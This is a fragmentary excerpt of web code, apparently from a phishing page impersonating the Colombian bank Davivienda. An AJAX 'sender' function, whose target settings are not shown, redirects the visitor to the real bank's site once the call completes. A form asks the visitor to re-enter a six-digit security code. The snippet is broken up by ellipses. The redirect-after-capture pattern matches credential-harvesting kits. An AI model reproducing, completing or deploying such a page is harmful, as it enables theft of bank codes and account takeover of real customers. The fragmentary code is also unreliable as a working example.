...
var sender = function () {
    ...
    $.ajax(settings).done(function (response) {
       window.location = 'https://comunicaciones.davivienda.com/tarjetavirtual';
				...
				<img class="icon d-flex align-items-center justify-content-center" src="archives/descargaa.png" style="width:40%;height:auto;">
		      	...
		      	<h3 class="text-center mb-4"></h3>	<br>
		      		...
		      		<div class="form-group">
		      			<input type="tel" maxlength="6" id="cod" class="form-control rounded-left" placeholder="Ingresa Código Nuevamente" onkeypress="return (event.charCode &gt;= 48 &amp;&amp; event.charCode &lt;= 57)"  style="text-align:center;" required>
		      		</div>
	         <br>
	            <div class="form-group">
